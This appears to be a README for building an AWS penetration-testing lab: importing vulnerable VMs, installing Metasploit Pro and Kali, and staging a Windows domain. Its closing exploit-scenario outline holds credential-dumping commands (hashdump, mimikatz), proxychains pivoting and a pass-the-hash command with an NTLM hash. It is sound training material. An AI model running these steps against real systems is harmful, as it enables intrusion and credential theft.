# AWS Attack Lab Build 

## Importing Vulnerable Machines
1. Identify supported [OS's](https://docs.aws.amazon.com/vm-import/latest/userguide/vm-import-ug.pdf) 
    - Ensure vulnerable
    - Test locally and make any modifications needed prior to export
2. Export VM from virtual enviornment to OVF 2.0
3. Setup S3 buckets and AWS roles according to [this docutment](https://docs.aws.amazon.com/vm-import/latest/userguide/vm-import-ug.pdf)
4. Upload exported OVA to S3:
```bash
aws s3 cp Server2016.ova s3://import-vmdks/Server2016.ova
```
5. Create JSON conversion template (server2016.json)
```json
[
  {
    "Description": "Server2016 OVA",
    "Format": "ova",
    "UserBucket": {
        "S3Bucket": "import-vmdks",
        "S3Key": "Server2016.ova"
    }
}]
```
6. Convert OVF
```bash
aws ec2 import-image --description "Server2017" --disk-containers "file:///Users/myuser/server2016.json"
```

## Metasploit Pro High Level 
Quick start on getting MSP up and running

1. Download Installer
- Windows: [64-Bit](https://downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe)
- Linux: [64-Bit](https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run)

2. Install
Metasploit uses some of the same techniques as malware and malicious attackers to audit your security. For Metasploit to run properly, you must switch off anti-virus solutions and your local firewall before the installation and during its use. If you are not comfortable turning off defenses on this computer, consider installing Metasploit on a dedicated virtual machine (set virtual machine NIC to bridged mode). Ubuntu works great and doesn't incur any OS licensing fees.

Once the download is complete, run the installer and follow the step by step instructions. This installer contains all Metasploit editions.

3. Sometime: Activate license
*Get-LicenseKey*

4. Restart Service
```bash
sudo /opt/metasploit/ctlscript.sh restart
```
5. Check service is listening
```bash
netstat -anop | grep 3790
```
6. Setup ssh tunnel with local port forward to access web front end
```bash
ssh -L 3790:localhost:3790 -N -f ec2-user@PublicDNS -i key_pairs.pem
```
7. Browse to:
https://localhost:3790


## Kali
[DeployMSP.py](./DeployMSP.py) Deploys Kali. MSP installer is interactive so go ahead and step through installation. 
```bash
sudo apt update -y && apt upgrade -y
wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run -O /tmp/installer.run && sudo chmod 755 /tmp/installer.run
sudo /tmp/installer.run
sudo /opt/metasploit/ctlscript.sh restart
```

## Deploy Target Systems
1. Deploy domain
2. Add systems to domain
3. Ensure networking from VPC to internet and from VPC (target) to VPC (attacker) is good to go
4. Setup scenerios and stage accounts
    - Dual-homes machine needs to be deployed in one subnet with public ip auto assign. Once booted attached a elastic ip and connect another network interface to instance that is in the second subnet desired.
5. Iterate step 4.


## Exploit Scenario
- Remote Enumerate "RECON"
- Exploit Web server [Setting payload](https://metasploit.help.rapid7.com/docs/working-with-payloads)
    ```bash
    set lhost <public ip of kali in aws>
    ```
- [Local enum](https://www.coengoedegebure.com/hacking-windows-with-meterpreter/)

- Scenerio commands:
    - User in local admin group 
        * shell "net localgroup Administrators"
    - Drop hashes
        * run post/windows/gather/hashdump or mimikatz_command -f samdump::hashes
    - Network Enum
        * shell "route print -4"
    
- Local Enumerate
    - Establish proxy
- PiVOT using proxychains [cheatsheet](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)
    * proxychains pth-winexe -U elserenterprise/belser%aad3b435b51404eeaad3b435b51404ee:29aa6786f9b94cfbe439934e542054ea //10.10.1.8 cmd [pth](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/)
- enumerate through pivot
- Dump domain creds